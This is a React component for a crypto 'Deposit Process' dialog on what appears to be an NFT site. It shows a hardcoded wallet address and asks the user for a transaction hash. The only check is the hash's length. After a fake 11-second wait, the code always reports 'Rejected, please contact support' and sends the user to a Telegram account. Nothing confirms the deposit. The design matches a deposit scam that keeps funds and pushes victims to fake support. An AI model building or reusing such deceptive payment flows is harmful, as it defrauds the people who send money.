import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { DepositConfirmationContent } from './profile/DepositConfirmationContent';

interface DepositConfirmationDialogProps {
  isOpen: boolean;
  onClose: () => void;
  amount: string;
  onConfirm: (hash: string) => void;
}

const DepositConfirmationDialog = ({
  isOpen,
  onClose,
  amount,
  onConfirm
}: DepositConfirmationDialogProps) => {
  const [step, setStep] = useState<'hash'>('hash');
  const [transactionHash, setTransactionHash] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";

  const validateHash = (hash: string) => {
    if (hash.length < 10) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Invalid hash, please check your input"
      });
      return false;
    }
    return true;
  };

  const handleSubmit = async () => {
    if (!validateHash(transactionHash)) {
      return;
    }

    setIsSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 11000));
    setIsSubmitting(false);
    
    toast({
      variant: "destructive",
      title: "Rejected",
      description: "Please contact support"
    });
    
    onConfirm(transactionHash);
  };

  const handleClose = () => {
    setTransactionHash("");
    onClose();
  };

  const handleTelegramHelp = () => {
    window.open('https://t.me/purenftsupport', '_blank');
  };

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Deposit Process</DialogTitle>
          <DialogDescription className="space-y-4">
            <DepositConfirmationContent
              step="hash"
              depositAmount={amount}
              transactionHash={transactionHash}
              isSubmitting={isSubmitting}
              walletAddress={walletAddress}
              onDepositAmountChange={() => {}}
              onTransactionHashChange={setTransactionHash}
              onNextStep={() => {}}
              onClose={handleClose}
              onSubmit={handleSubmit}
              onTelegramHelp={handleTelegramHelp}
            />
          </DialogDescription>
        </DialogHeader>
      </DialogContent>
    </Dialog>
  );
};

export default DepositConfirmationDialog;